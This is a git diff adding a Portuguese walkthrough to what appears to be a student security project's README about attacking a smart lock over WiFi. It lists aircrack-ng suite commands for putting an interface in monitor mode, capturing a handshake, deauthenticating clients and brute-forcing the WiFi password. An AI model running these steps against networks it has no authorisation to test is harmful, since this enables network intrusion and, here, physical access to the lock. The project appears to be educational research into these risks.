@@ -58,7 +58,32 @@ da senha da rede WiFi na qual o dispositivo está conectado, descrevendo os risc
 Por meio da utilização do script [Automap](https://github.com/iuribpmoro/Automap) que realizam o reconhecimento, scanning e enumeração da rede, descobre-se, por fim, como operar a fechadura por meio de requisições web, finalizando o processo de ataque.
 
 ### Roteiro dos Ataques
-
+#### Setup da Interface
+- Iniciar modo de monitoramento da interface WiFi:
+```bash
+sudo airmon-ng start wlan0
+```
+- Verifique as interfaces wireless:
+```bash
+sudo iwconfig
+```
+#### 
+- Realize o scan das redes próximas e tome nota do BSSID e Channel da rede alvo:
+```bash
+sudo airodump-ng wlan0mon
+```
+- Realize o scan da rede alvo, tomando nota do MAC dos dispositivos conectados e salvando os handshakes a serem capturados:
+```bash
+sudo airodump-ng -c <CANAL_DA_REDE> --bssid <BSSID_DA_REDE> -w <PREFIXO_DO_ARQUIVO_DE_OUTPUT> wlan0mon
+```
+- Em outro terminal, enquanto o outro roda o comando anterior, expulse os hosts da rede por meio de um ataque de deauthentication:
+```bash
+sudo aireplay-ng -0 2 -a <BSSID_DA_REDE> -c <MAC_DO_DISPOSITIVO>
+```
+- Realize um ataque de força bruta nos pacotes capturados para tentar realizar a quebra da senha:
+```bash
+sudo aircrack-ng <ARQUIVO>.cap -w <WORDLIST>
+```
 
 ## Autores
 ### Gabrieli Silva
